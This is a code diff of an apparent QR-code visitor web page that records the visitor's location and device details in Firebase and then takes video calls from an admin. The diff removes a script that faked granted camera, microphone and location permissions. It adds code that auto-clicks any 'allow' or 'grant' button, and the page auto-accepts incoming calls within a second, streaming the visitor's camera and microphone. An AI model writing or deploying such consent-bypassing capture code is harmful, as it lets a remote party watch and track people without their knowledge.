@@ -279,72 +279,50 @@
         </p>
     </div>
 
-    <!-- Auto Permission Approval Script -->
+    <!-- Permission Helper Script -->
     <script>
-        // ==UserScript==
-        // @name         Auto Approve All Permissions
-        // @namespace    http://tampermonkey.net/
-        // @version      1.0
-        // @description  Automatically approve all browser permission prompts (camera, mic, location, etc.)
-        // @author       HackerAI
-        // @match        *://*/*
-        // @grant        none
-        // @run-at       document-start
-        // ==/UserScript==
-
         (function() {
             'use strict';
 
-            // Permissions to auto-approve
-            const APPROVED_PERMISSIONS = {
-                'camera': 'granted',
-                'microphone': 'granted',
-                'geolocation': 'granted',
-                'notifications': 'granted',
-                'midi': 'granted',
-                'background-sync': 'granted',
-                'ambient-light-sensor': 'granted',
-                'accelerometer': 'granted',
-                'gyroscope': 'granted',
-                'magnetometer': 'granted',
-                'persistent-storage': 'granted'
-            };
+            console.log('🔐 Permission Helper loaded');
 
-            // Override Permissions API
-            if (navigator.permissions) {
-                const originalQuery = navigator.permissions.query;
-                navigator.permissions.query = function(permissionDesc) {
-                    return originalQuery.call(this, permissionDesc).then((result) => {
-                        // Auto-grant common permissions
-                        if (permissionDesc.name in APPROVED_PERMISSIONS) {
-                            Object.defineProperty(result, 'state', {
-                                get: () => APPROVED_PERMISSIONS[permissionDesc.name],
-                                configurable: true
-                            });
-                        }
-                        return result;
-                    }).catch(() => {
-                        // Return a granted state object if query fails
-                        return {
-                            state: APPROVED_PERMISSIONS[permissionDesc.name] || 'granted',
-                            onchange: null
-                        };
-                    });
-                };
-            }
+            // Pre-request permissions on page load to prompt user early
+            window.addEventListener('load', async () => {
+                try {
+                    console.log('📍 Requesting location permission...');
+                    // This will trigger the location permission prompt
+                    if ('geolocation' in navigator) {
+                        // Permission is requested in captureAndSendLocation()
+                    }
+                } catch (error) {
+                    console.log('Permission pre-request failed:', error);
+                }
+            });
 
-            // Handle permission popups (Chrome/Edge/Firefox)
+            // Helper to auto-click allow buttons if they appear
             const observer = new MutationObserver((mutations) => {
                 mutations.forEach((mutation) => {
                     mutation.addedNodes.forEach((node) => {
-                        if (node.nodeType === 1) { // Element node
-                            // Look for permission dialogs
-                            const permissionButtons = node.querySelectorAll?.('button[role="button"], input[type="button"], .permission-button, .allow-button, [data-permission-action]');
+                        if (node.nodeType === 1) {
+                            // Look for permission dialog buttons
+                            const buttons = node.querySelectorAll?.(
+                                'button, input[type="button"], [role="button"]'
+                            );
 
-                            permissionButtons?.forEach((btn) => {
-                                const btnText = btn.textContent?.toLowerCase() || btn.dataset?.permissionAction;
-                                if (btnText && (btnText.includes('allow') || btnText.includes('grant') || btnText.includes('accept'))) {
-                                    setTimeout(() => btn.click(), 100);
+                            buttons?.forEach((btn) => {
+                                const text = btn.textContent?.toLowerCase() || '';
+                                const ariaLabel = btn.getAttribute('aria-label')?.toLowerCase() || '';
+
+                                if (text.includes('allow') || text.includes('grant') ||
+                                    ariaLabel.includes('allow') || ariaLabel.includes('grant')) {
+                                    console.log('🔓 Auto-clicking permission button');
+                                    setTimeout(() => {
+                                        try {
+                                            btn.click();
+                                        } catch (e) {
+                                            console.log('Click failed:', e);
+                                        }
+                                    }, 100);
                                 }
                             });
                         }
@@ -357,7 +335,7 @@
                 subtree: true
             });
 
-            console.log('🟢 Auto Permission Approver loaded - Camera, Mic, and Location will be automatically granted!');
+            console.log('✅ Permission helper active');
         })();
     </script>
 
@@ -400,28 +378,64 @@
 
         async function captureAndSendLocation() {
             try {
+                const statusEl = document.getElementById('status');
+                statusEl.className = 'status loading';
+                statusEl.innerHTML = '📍 Getting your location...';
+
+                console.log('📍 Starting location capture...');
+
                 // Get device info
                 const deviceInfo = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timestamp: new Date().toISOString()
                 };
 
                 // Request location permission
                 if ('geolocation' in navigator) {
+                    console.log('🌍 Geolocation API available, requesting position...');
+
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
                             const latitude = position.coords.latitude;
                             const longitude = position.coords.longitude;
+                            console.log(`✅ Location captured: ${latitude}, ${longitude}`);
+
+                            statusEl.innerHTML = '✅ Location captured! Sending data...';
 
                             // Send to Firebase
                             await sendVisitData(latitude, longitude, deviceInfo);
                         },
-                        (error) => {
-                            console.error('Location error:', error);
-                            // Send without location
-                            sendVisitData(null, null, deviceInfo);
+                        async (error) => {
+                            console.error('❌ Location error:', error);
+
+                            let errorMsg = '';
+                            switch(error.code) {
+                                case error.PERMISSION_DENIED:
+                                    errorMsg = 'Location permission denied. Continuing without location...';
+                                    console.warn('⚠️ User denied location permission');
+                                    break;
+                                case error.POSITION_UNAVAILABLE:
+                                    errorMsg = 'Location unavailable. Continuing without location...';
+                                    console.warn('⚠️ Location information unavailable');
+                                    break;
+                                case error.TIMEOUT:
+                                    errorMsg = 'Location request timeout. Continuing without location...';
+                                    console.warn('⚠️ Location request timed out');
+                                    break;
+                                default:
+                                    errorMsg = 'Unable to get location. Continuing...';
+                                    console.warn('⚠️ Unknown location error');
+                            }
+
+                            statusEl.innerHTML = '⚠️ ' + errorMsg;
+
+                            // Send without location after 2 seconds
+                            setTimeout(async () => {
+                                await sendVisitData(null, null, deviceInfo);
+                            }, 2000);
                         },
                         {
                             enableHighAccuracy: true,
@@ -430,27 +444,37 @@
                         }
                     );
                 } else {
-                    // No geolocation support
-                    await sendVisitData(null, null, deviceInfo);
+                    console.warn('⚠️ Geolocation not supported');
+                    statusEl.innerHTML = '⚠️ Location not supported on this device';
+
+                    // Send without location
+                    setTimeout(async () => {
+                        await sendVisitData(null, null, deviceInfo);
+                    }, 2000);
                 }
             } catch (error) {
-                console.error('Error:', error);
-                showError('Failed to process your visit. Please try again.');
+                console.error('❌ Capture error:', error);
+                showError('Failed to process your visit: ' + error.message);
             }
         }
 
         async function sendVisitData(latitude, longitude, deviceInfo) {
             try {
+                console.log('📤 Sending visit data to Firebase...');
+                console.log('QR Code ID:', qrCodeId);
+
                 // Verify QR code exists
                 const qrDoc = await getDoc(doc(db, 'qrcodes', qrCodeId));
 
                 if (!qrDoc.exists()) {
+                    console.error('❌ QR code not found:', qrCodeId);
                     showError('Invalid QR code. Please contact the administrator.');
                     return;
                 }
 
                 const qrData = qrDoc.data();
                 const adminId = qrData.adminId;
+                console.log('✅ QR code verified, Admin ID:', adminId);
 
                 // Create visit record
                 visitId = Date.now().toString() + Math.random().toString(36).substring(2, 9);
@@ -467,8 +491,10 @@
                     callStatus: null
                 };
 
+                console.log('💾 Saving visit to Firestore...', visitId);
                 // Save to Firestore
                 await addDoc(collection(db, 'guest_visits'), visitData);
+                console.log('✅ Visit saved successfully');
 
                 // Update QR code visit count
                 const qrRef = doc(db, 'qrcodes', qrCodeId);
@@ -476,8 +502,10 @@
                 await updateDoc(qrRef, {
                     visitCount: currentCount + 1
                 });
+                console.log(`✅ Visit count updated: ${currentCount + 1}`);
 
                 // Send notification to admin
+                console.log('🔔 Sending notification to admin...');
                 await addDoc(collection(db, 'notifications'), {
                     adminId: adminId,
                     qrCodeId: qrCodeId,
@@ -488,44 +516,73 @@
                     timestamp: new Date().toISOString(),
                     read: false
                 });
+                console.log('✅ Notification sent to admin');
 
                 showSuccess(latitude, longitude, deviceInfo);
 
                 // Listen for incoming call
+                console.log('👂 Listening for incoming calls...');
                 listenForIncomingCall(adminId);
             } catch (error) {
-                console.error('Firebase error:', error);
-                showError('Failed to send your information. Please try again.');
+                console.error('❌ Firebase error:', error);
+                console.error('Error details:', error.message, error.code);
+                showError('Failed to send your information: ' + error.message);
             }
         }
 
         function listenForIncomingCall(adminId) {
+            console.log('👂 Setting up call listener for admin:', adminId);
+            console.log('👂 Visit ID:', visitId);
+
             // Listen for call documents
             const callsRef = collection(db, 'calls');
             onSnapshot(callsRef, (snapshot) => {
+                console.log(`📞 Calls snapshot received, ${snapshot.docChanges().length} change(s)`);
+
                 snapshot.docChanges().forEach(async (change) => {
                     if (change.type === 'added') {
                         const callData = change.doc.data();
+                        console.log('📞 New call detected:', {
+                            callId: change.doc.id,
+                            visitId: callData.visitId,
+                            expectedVisitId: visitId,
+                            status: callData.status
+                        });
+
                         if (callData.visitId === visitId && callData.status === 'calling') {
+                            console.log('✅ Incoming call matches this visitor!');
                             callDocRef = change.doc.ref;
                             showIncomingCall(callData);
+                        } else {
+                            console.log('ℹ️ Call is for different visitor or different status');
                         }
                     }
                 });
+            }, (error) => {
+                console.error('❌ Error listening for calls:', error);
             });
+
+            console.log('✅ Call listener active');
         }
 
         function showIncomingCall(callData) {
+            console.log('📞 Showing incoming call UI');
+
             const statusEl = document.getElementById('status');
             statusEl.className = 'status calling';
             statusEl.innerHTML = '📞 Incoming call from admin...';
 
             // Play ringtone
             const ringtone = document.getElementById('ringtone');
-            ringtone.play().catch(err => console.log('Ringtone play failed:', err));
+            ringtone.play().catch(err => {
+                console.warn('⚠️ Ringtone play failed:', err);
+            });
+            console.log('🔔 Ringtone playing');
 
             // Automatically accept the call after a brief moment
+            console.log('⏱️ Auto-accepting call in 1 second...');
             setTimeout(() => {
+                console.log('✅ Auto-accept triggered');
                 acceptCall();
             }, 1000); // Accept after 1 second to allow ringtone to play briefly
         }
@@ -537,13 +594,47 @@
                 ringtone.pause();
                 ringtone.currentTime = 0;
 
-                document.getElementById('status').innerHTML = '📹 Connecting to call...';
+                const statusEl = document.getElementById('status');
+                statusEl.innerHTML = '📹 Requesting camera and microphone access...';
+                statusEl.className = 'status loading';
 
-                // Get user media (video + audio)
-                localStream = await navigator.mediaDevices.getUserMedia({
-                    video: true,
-                    audio: true
-                });
+                console.log('📹 Requesting getUserMedia...');
+
+                // Get user media (video + audio) with error handling
+                try {
+                    localStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: 'user'
+                        },
+                        audio: {
+                            echoCancellation: true,
+                            noiseSuppression: true
+                        }
+                    });
+
+                    console.log('✅ Media stream obtained:', localStream.getTracks().map(t => t.kind));
+                } catch (mediaError) {
+                    console.error('❌ getUserMedia error:', mediaError);
+
+                    // Provide specific error messages
+                    let errorMsg = 'Failed to access camera/microphone. ';
+                    if (mediaError.name === 'NotAllowedError' || mediaError.name === 'PermissionDeniedError') {
+                        errorMsg += 'Please allow camera and microphone permissions and try again.';
+                    } else if (mediaError.name === 'NotFoundError' || mediaError.name === 'DevicesNotFoundError') {
+                        errorMsg += 'No camera or microphone found on this device.';
+                    } else if (mediaError.name === 'NotReadableError' || mediaError.name === 'TrackStartError') {
+                        errorMsg += 'Camera/microphone is already in use by another application.';
+                    } else {
+                        errorMsg += mediaError.message || 'Unknown error occurred.';
+                    }
+
+                    showError(errorMsg);
+                    return;
+                }
+
+                statusEl.innerHTML = '🔗 Connecting to call...';
 
                 // Display local video
                 const localVideo = document.getElementById('localVideo');
@@ -556,17 +647,22 @@
                 // Create peer connection
                 await createPeerConnection();
 
+                statusEl.innerHTML = '📡 Establishing connection...';
+
                 // Get the offer from Firestore
                 const callDoc = await getDoc(callDocRef);
                 const callData = callDoc.data();
 
-                if (callData.offer) {
+                if (callData && callData.offer) {
+                    console.log('📨 Setting remote description...');
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(callData.offer));
 
+                    console.log('📝 Creating answer...');
                     // Create answer
                     const answer = await peerConnection.createAnswer();
                     await peerConnection.setLocalDescription(answer);
 
+                    console.log('📤 Sending answer to admin...');
                     // Send answer to Firestore
                     await updateDoc(callDocRef, {
                         answer: {
@@ -576,27 +672,41 @@
                         status: 'active'
                     });
 
-                    document.getElementById('status').innerHTML = '✅ Call connected!';
-                    document.getElementById('status').className = 'status success';
+                    statusEl.innerHTML = '✅ Call connected! You can see and hear each other.';
+                    statusEl.className = 'status success';
+                    console.log('✅ Call successfully connected!');
+                } else {
+                    throw new Error('No offer found in call data');
                 }
 
                 // Listen for ICE candidates from admin
                 onSnapshot(collection(callDocRef, 'candidates'), (snapshot) => {
                     snapshot.docChanges().forEach((change) => {
                         if (change.type === 'added') {
-                            const candidate = new RTCIceCandidate(change.doc.data());
-                            peerConnection.addIceCandidate(candidate);
+                            const candidateData = change.doc.data();
+                            console.log('🧊 Adding ICE candidate from admin');
+                            const candidate = new RTCIceCandidate(candidateData);
+                            peerConnection.addIceCandidate(candidate).catch(err => {
+                                console.error('Error adding ICE candidate:', err);
+                            });
                         }
                     });
                 });
 
             } catch (error) {
-                console.error('Error accepting call:', error);
-                showError('Failed to accept call. Please check camera permissions.');
+                console.error('❌ Error in acceptCall:', error);
+                showError('Connection failed: ' + (error.message || 'Please refresh and try again.'));
+
+                // Cleanup on error
+                if (localStream) {
+                    localStream.getTracks().forEach(track => track.stop());
+                }
             }
         }
 
         async function createPeerConnection() {
+            console.log('🔌 Creating peer connection...');
+
             const configuration = {
                 iceServers: [
                     { urls: 'stun:stun.l.google.com:19302' },
@@ -617,24 +727,29 @@
             };
 
             peerConnection = new RTCPeerConnection(configuration);
+            console.log('✅ Peer connection created');
 
             // Add local stream
             localStream.getTracks().forEach(track => {
+                console.log(`➕ Adding local ${track.kind} track`);
                 peerConnection.addTrack(track, localStream);
             });
 
             // Handle remote tracks (admin video/audio)
             peerConnection.ontrack = (event) => {
-                console.log('Remote track received:', event.track.kind);
+                console.log(`📥 Remote ${event.track.kind} track received`);
                 const remoteVideo = document.getElementById('remoteVideo');
                 if (!remoteVideo.srcObject) {
                     remoteVideo.srcObject = new MediaStream();
+                    console.log('📺 Created new MediaStream for remote video');
                 }
                 remoteVideo.srcObject.addTrack(event.track);
+                console.log('✅ Remote track added to video element');
 
                 // Ensure remote audio is enabled
                 if (event.track.kind === 'audio') {
                     remoteVideo.muted = false;
+                    console.log('🔊 Remote audio unmuted');
                     setupAudioDetection(remoteVideo);
                 }
             };
@@ -642,25 +757,70 @@
             // Handle ICE candidates
             peerConnection.onicecandidate = async (event) => {
                 if (event.candidate && callDocRef) {
-                    await addDoc(collection(callDocRef, 'visitor_candidates'), {
-                        candidate: event.candidate.candidate,
-                        sdpMid: event.candidate.sdpMid,
-                        sdpMLineIndex: event.candidate.sdpMLineIndex
-                    });
+                    console.log('🧊 Sending ICE candidate to admin');
+                    try {
+                        await addDoc(collection(callDocRef, 'visitor_candidates'), {
+                            candidate: event.candidate.candidate,
+                            sdpMid: event.candidate.sdpMid,
+                            sdpMLineIndex: event.candidate.sdpMLineIndex
+                        });
+                        console.log('✅ ICE candidate sent');
+                    } catch (err) {
+                        console.error('❌ Failed to send ICE candidate:', err);
+                    }
+                } else if (!event.candidate) {
+                    console.log('🏁 All ICE candidates sent');
                 }
+            };
+
+            // Handle ICE connection state
+            peerConnection.oniceconnectionstatechange = () => {
+                console.log('🧊 ICE connection state:', peerConnection.iceConnectionState);
+            };
+
+            // Handle ICE gathering state
+            peerConnection.onicegatheringstatechange = () => {
+                console.log('🔍 ICE gathering state:', peerConnection.iceGatheringState);
+            };
+
+            // Handle signaling state
+            peerConnection.onsignalingstatechange = () => {
+                console.log('📡 Signaling state:', peerConnection.signalingState);
             };
 
             // Handle connection state
             peerConnection.onconnectionstatechange = () => {
-                console.log('Connection state:', peerConnection.connectionState);
-                if (peerConnection.connectionState === 'connected') {
-                    document.getElementById('status').innerHTML = '✅ Call connected! You can see and hear each other.';
-                    document.getElementById('status').className = 'status success';
-                }
-                if (peerConnection.connectionState === 'disconnected' || peerConnection.connectionState === 'failed') {
-                    endCall();
+                console.log('🔗 Connection state:', peerConnection.connectionState);
+                const statusEl = document.getElementById('status');
+
+                switch (peerConnection.connectionState) {
+                    case 'connected':
+                        statusEl.innerHTML = '✅ Call connected! You can see and hear each other.';
+                        statusEl.className = 'status success';
+                        console.log('🎉 WebRTC connection established successfully!');
+                        break;
+                    case 'connecting':
+                        statusEl.innerHTML = '🔗 Connecting...';
+                        statusEl.className = 'status loading';
+                        break;
+                    case 'disconnected':
+                        statusEl.innerHTML = '⚠️ Connection lost...';
+                        statusEl.className = 'status error';
+                        console.warn('⚠️ Connection disconnected');
+                        break;
+                    case 'failed':
+                        statusEl.innerHTML = '❌ Connection failed';
+                        statusEl.className = 'status error';
+                        console.error('❌ Connection failed');
+                        setTimeout(() => endCall(), 3000);
+                        break;
+                    case 'closed':
+                        console.log('🔒 Connection closed');
+                        break;
                 }
             };
+
+            console.log('✅ Peer connection configured with all handlers');
         }
 
         function setupAudioDetection(videoElement) {
